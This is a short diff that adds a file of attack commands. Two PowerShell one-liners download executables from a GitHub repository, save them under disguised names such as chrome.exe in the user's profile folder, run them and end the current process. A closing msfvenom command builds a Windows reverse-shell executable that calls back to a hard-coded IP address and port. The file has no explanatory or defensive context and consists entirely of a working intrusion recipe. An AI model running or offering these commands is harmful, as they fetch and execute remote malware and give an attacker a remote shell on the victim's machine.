@@ -1,0 +1,5 @@
+wget https://github.com/fontapentest2/happyhappy/raw/main/agent.exe -OutFile $env:userprofile\\chrome.exe; start-process $env:userprofile\\chrome.exe; stop-process -Id $PID
+
+wget https://github.com/fontapentest2/happyhappy/raw/main/payload_msf.exe -OutFile $env:userprofile\\agent_mfs.exe; start-process $env:userprofile\\agent_mfs.exe; stop-process -Id $PID
+
+msfvenom -p windows/x64/shell_reverse_tcp lhost=200.98.160.80 lport=8080 -f exe -o payload_msf_local.exe
